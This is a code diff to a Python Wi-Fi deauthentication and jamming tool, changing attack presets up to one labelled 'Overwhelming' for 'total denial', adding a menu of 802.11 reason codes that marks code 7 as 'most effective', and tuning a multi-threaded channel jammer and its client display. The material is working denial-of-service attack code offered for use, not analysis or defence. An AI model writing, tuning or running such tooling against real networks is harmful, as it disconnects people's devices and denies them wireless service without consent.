@@ -210,7 +210,7 @@ MAX_CLIENTS_PER_AP = 5
 # Packet rate tracking
 class PacketRateTracker:
     """Track packets per second using sliding window"""
-    def __init__(self, window_seconds=1.0):
+    def __init__(self, window_seconds=5.0):
         self.window = window_seconds
         self.timestamps = deque()
         self.lock = threading.Lock()
@@ -239,10 +239,6 @@ class PacketRateTracker:
             return total
 
 # DEAUTH PRESETS
-# Updated with realistic hardware limitations:
-# - Scapy's sendp() minimum reliable delay: ~0.001s
-# - Values below 0.001s cause unpredictable timing
-# - Recommended: 0.01s+ for stability
 DEAUTH_PRESETS = {
     '1': {
         'name': 'Stealthy',
@@ -256,8 +252,8 @@ DEAUTH_PRESETS = {
     '2': {
         'name': 'Balanced',
         'description': 'Recommended - Good balance',
-        'packets': 10,
-        'delay': 0.01,
+        'packets': 25,
+        'delay': 0.1,
         'code': 7,
         'disas': True,
         'color': c.BRIGHT_GREEN
@@ -265,8 +261,8 @@ DEAUTH_PRESETS = {
     '3': {
         'name': 'Aggressive',
         'description': 'High intensity, fast disconnect',
-        'packets': 15,
-        'delay': 0.01,
+        'packets': 25,
+        'delay': 0.005,
         'code': 7,
         'disas': True,
         'color': c.BRIGHT_YELLOW
@@ -274,8 +270,8 @@ DEAUTH_PRESETS = {
     '4': {
         'name': 'Overwhelming',
         'description': 'Maximum power, total denial',
-        'packets': 25,
-        'delay': 0.005,
+        'packets': 50,
+        'delay': 0.001,
         'code': 2,
         'disas': True,
         'color': c.BRIGHT_RED
@@ -745,9 +741,26 @@ def configure_deauth_params():
                         except ValueError:
                             print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid input\n")
 
+                    print()
+                    print(f"{c.BRIGHT_YELLOW}IEEE 802.11 Deauth Reason Codes:{c.RESET}")
+                    print()
+                    print(f"  {c.BRIGHT_CYAN}1{c.RESET} - Unspecified {c.GRAY}(Generic){c.RESET}")
+                    print(f"  {c.BRIGHT_CYAN}2{c.RESET} - Invalid auth {c.GRAY}(Forceful){c.RESET}")
+                    print(f"  {c.BRIGHT_GREEN}3{c.RESET} - Station leaving {c.GRAY}(Natural){c.RESET}")
+                    print(f"  {c.BRIGHT_CYAN}4{c.RESET} - Inactivity")
+                    print(f"  {c.BRIGHT_CYAN}5{c.RESET} - AP overload")
+                    print(f"  {c.BRIGHT_CYAN}6{c.RESET} - Class 2 frame")
+                    print(f"  {c.BRIGHT_GREEN}7{c.RESET} - Class 3 frame {c.GRAY}(Most effective){c.RESET}")
+                    print(f"  {c.BRIGHT_CYAN}8{c.RESET} - BSS leaving")
+                    print()
+                    print(f"{c.GRAY}Tip: 7 = effective, 3 = natural{c.RESET}")
+                    print()
+
                     while True:
                         try:
-                            code_choice = input(f"{c.BRIGHT_CYAN}Deauth code [1-8] or custom [0-255]: {c.RESET}").strip()
+                            code_choice = input(f"{c.BRIGHT_CYAN}Deauth code [1-8] or Enter for 7: {c.RESET}").strip()
+                            if not code_choice:
+                                code_choice = "7"
                             code = int(code_choice)
                             if 0 <= code <= 255:
                                 deauth_code = code
@@ -1300,7 +1313,7 @@ class ChannelHopper(threading.Thread):
         self.running = False
 
 class ChannelWorker(threading.Thread):
-    def __init__(self, worker_id, interface, channel_hopper):
+    def __init__(self, worker_id, interface, channel_hopper, num_workers=1):
         super().__init__(daemon=True)
         self.worker_id = worker_id
         self.interface = interface
@@ -1420,7 +1433,7 @@ class MultiThreadedJammer:
         time.sleep(0.5)
 
         for i in range(self.num_workers):
-            worker = ChannelWorker(i, self.interface, self.channel_hopper)
+            worker = ChannelWorker(i, self.interface, self.channel_hopper, self.num_workers)
             worker.start()
             self.workers.append(worker)
 
@@ -1634,10 +1647,16 @@ def statistics_display_ansi():
                                     client_vendor = client_info.get('vendor', '<unknown vendor>')[:23]
                                     client_pkts_per_sec = client_info.get('rate_tracker', PacketRateTracker()).get_rate()
 
-                                    client_power_color = c.DARK_GRAY
+                                    # Dynamic power color for client
+                                    client_power_color = get_power_color(client_power)
 
-                                    # "Client" in ESSID column
-                                    print(f"  {client_power_color}{client_power.rjust(4)} dBm{c.RESET}  {c.DARK_GRAY}{'Client'.ljust(25)}{c.RESET} {c.DARK_CYAN}{client_mac.ljust(18)}{c.RESET} {c.DARK_GRAY}{client_vendor.ljust(30)}{c.RESET} {''.ljust(10)} {''.ljust(7)} {c.DARK_GRAY}{str(client_pkts_per_sec).rjust(5)} pkts/s{c.RESET}")
+                                    # "Client" in ESSID column - with arrow and PERFECT alignment
+                                    client_arrow = f"{c.GRAY}◀{c.RESET}" if client_pkts_per_sec > 0 else ""
+                                    # Hämta AP channel och protocol för client
+                                    client_channel = stats.get('channel', '-')
+                                    client_protocol = stats.get('protocol', 'Unknown')[:10]
+
+                                    print(f"  {c.GRAY}{client_power.rjust(4)} dBm{c.RESET}  {c.GRAY}{'Client'.ljust(25)}{c.RESET} {c.DARK_CYAN}{client_mac.ljust(18)}{c.RESET} {c.GRAY}{client_vendor.ljust(30)}{c.RESET} {c.GRAY}{client_protocol.ljust(10)}{c.RESET} {c.GRAY}{str(client_channel).rjust(3)}{c.RESET} {c.GRAY}{str(client_pkts_per_sec).rjust(5)} pkts/s{c.RESET} {client_arrow}")
 
                         if remaining_clients > 0:
                             print(f"  {c.GRAY}...and {remaining_clients} more clients{c.RESET}")
@@ -1653,7 +1672,16 @@ def statistics_display_ansi():
 
                         client_power_color = get_power_color(client_power)
 
-                        print(f"  {client_power_color}{client_power.rjust(4)} dBm{c.RESET}  {c.BRIGHT_CYAN}{'Station'.ljust(25)}{c.RESET} {c.BRIGHT_CYAN}{client_mac.ljust(18)}{c.RESET} {c.GRAY}{client_vendor.ljust(30)}{c.RESET} {''.ljust(10)} {''.ljust(7)} {c.GRAY}{str(client_pkts_per_sec).rjust(5)} pkts/s{c.RESET}")
+                        client_arrow = f"{c.GRAY}◀{c.RESET}" if client_pkts_per_sec > 0 else ""
+                        # Hämta AP channel och protocol för client
+                        ap_bssid = client_info.get('ap', '')
+                        client_channel = '-'
+                        client_protocol = 'Unknown'
+                        if ap_bssid and ap_bssid in target_stats:
+                            client_channel = target_stats[ap_bssid].get('channel', '-')
+                            client_protocol = target_stats[ap_bssid].get('protocol', 'Unknown')[:10]
+
+                        print(f"  {c.GRAY}{client_power.rjust(4)} dBm{c.RESET}  {c.GRAY}{'Station'.ljust(25)}{c.RESET} {c.DARK_CYAN}{client_mac.ljust(18)}{c.RESET} {c.GRAY}{client_vendor.ljust(30)}{c.RESET} {c.GRAY}{client_protocol.ljust(10)}{c.RESET} {c.GRAY}{str(client_channel).rjust(3)}{c.RESET} {c.GRAY}{str(client_pkts_per_sec).rjust(5)} pkts/s{c.RESET} {client_arrow}")
                         displayed_clients_count += 1
 
                         if displayed_clients_count >= MAX_APS_DISPLAY:
